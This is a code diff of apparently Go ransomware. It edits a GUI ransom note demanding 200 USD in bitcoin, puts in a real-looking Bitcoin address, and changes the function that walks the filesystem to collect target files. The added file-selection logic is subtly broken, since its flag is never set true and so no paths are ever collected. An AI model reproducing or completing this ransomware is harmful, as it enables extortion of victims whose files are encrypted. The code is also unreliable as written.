@@ -51,7 +51,7 @@ func main() {
 	hello := widget.NewLabel("Ooops! All your files has been encrypted to get them back send 200 USD to the bitcoin address bellow and contact us at @ with your transaction id")
 	w.SetContent(container.NewVBox(
 		hello,
-		widget.NewButton("bitcoin add: 0xkjqdkjlkdjqldjldql", func() {
+		widget.NewButton("bitcoin address: 17Zwp6cHg49G677Pkv2Xk4cxNKnDU8FkAR", func() {
 			hello.SetText("Don't forget to contact us at @ with your transaction id")
 		}),
 	))
@@ -65,7 +65,14 @@ func ListAll(path string) (paths []string) {
 			return filepath.SkipDir
 		}
 		if !info.IsDir() {
-			paths = append(paths, fullpath)
+			var flag bool
+			_, err := os.ReadFile(fullpath)
+			if err != nil {
+				flag = false
+			}
+			if flag {
+				paths = append(paths, fullpath)
+			}
 		}
 		return nil
 	})
